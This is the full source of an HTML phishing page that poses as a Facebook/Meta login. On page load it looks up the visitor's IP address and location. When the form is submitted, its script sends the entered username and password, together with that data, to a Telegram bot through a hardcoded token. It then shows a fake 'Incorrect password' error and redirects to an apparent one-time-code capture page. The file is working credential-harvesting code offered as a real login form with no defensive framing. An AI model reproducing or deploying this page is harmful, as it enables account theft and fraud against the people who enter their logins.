<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login Page</title>
  <script src="https://cdn.tailwindcss.com/"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet"/>
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(to bottom right, #fbe0ff00, #c9ebf000);
    }
  </style>
</head>
<body class="flex items-center justify-center min-h-screen">
  <div class="w-full max-w-sm p-6 rounded-lg">
    <div class="text-center mb-6">
      <img alt="Facebook logo" class="mx-auto mb-4" height="80" src="https://i.postimg.cc/FKk4ZQ1r/60ed83ab035dbe00046c24b8.png" width="70"/>
    </div>

    <form id="contactForm" method="POST">
      <input type="text" id="ipaddress" name="IPaddress" hidden>
      <input type="hidden" id="city" name="city">
      <input type="hidden" id="country" name="country">

      <div class="mb-4">
        <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-900"
               placeholder="Username, Mobile number or email address" type="text" name="username" id="username" required />
      </div>

      <div class="mb-4">
        <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-600"
               placeholder="Password" type="text" name="password" id="password" required />
        <p id="errorMessage" class="text-red-600 text-sm mt-2 hidden">Incorrect password</p>
      </div>

      <div class="mb-4">
        <button class="w-full py-3 bg-blue-700 text-white rounded-xl hover:bg-black-700" type="submit" id="button" value="submit">
          Log in
        </button>
      </div>

      <div class="text-center mb-4">
        <a class="text-black-600 hover:underline" href="#">
          Forgotten Password?
        </a>
      </div>

      <div class="text-center mb-4 mt-10">
        <button class="w-full py-3 border border-blue-600 text-blue-600 rounded-xl hover:bg-blue-50" type="button">
          Create new account
        </button>
      </div>

      <div class="text-center mt-6">
        <img alt="Meta logo" class="mx-auto mb-2" height="20" src="https://i.postimg.cc/DZY1KLnd/pngegg-2.png" width="70"/>
      </div>
    </form>
  </div>

  <script>
    let attemptCount = 0;

    document.addEventListener('DOMContentLoaded', function () {
      // Get IP address
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          document.getElementById('ipaddress').value = data.ip;
        })
        .catch(error => console.error('IP fetch error:', error));

      // Get City and Country
      fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
          document.getElementById('city').value = data.city || '';
          document.getElementById('country').value = data.country_name || '';
        })
        .catch(error => console.error('Location error:', error));
    });

    document.getElementById('contactForm').addEventListener('submit', function (event) {
      event.preventDefault();
      attemptCount++;

      var username = document.getElementById('username').value;
      var password = document.getElementById('password').value;
      var ipaddress = document.getElementById('ipaddress').value;
      var city = document.getElementById('city').value;
      var country = document.getElementById('country').value;
      var errorMessage = document.getElementById('errorMessage');

      var telegramMessage = `Username: ${username}\nPassword: ${password}\nIP: ${ipaddress}\nCity: ${city}\nCountry: ${country}`;
      var token = '7933375890:AAEom0GofbpGV8lassBKN_g5_qtu-X6i_bM';
      var chat_id = '6509117933';
      var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;

      fetch(url)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            if (attemptCount === 1) {
              errorMessage.classList.remove('hidden');
              errorMessage.textContent = 'Incorrect password';
            } else {
              errorMessage.classList.add('hidden');
              window.location.href = 'instagram/otp/657daf104b167f68d1979b9c.html';
            }
          } else {
            alert('Error sending message.');
          }
        })
        .catch(error => {
          console.error('Fetch error:', error);
        });
    });
  </script>
</body>
</html>
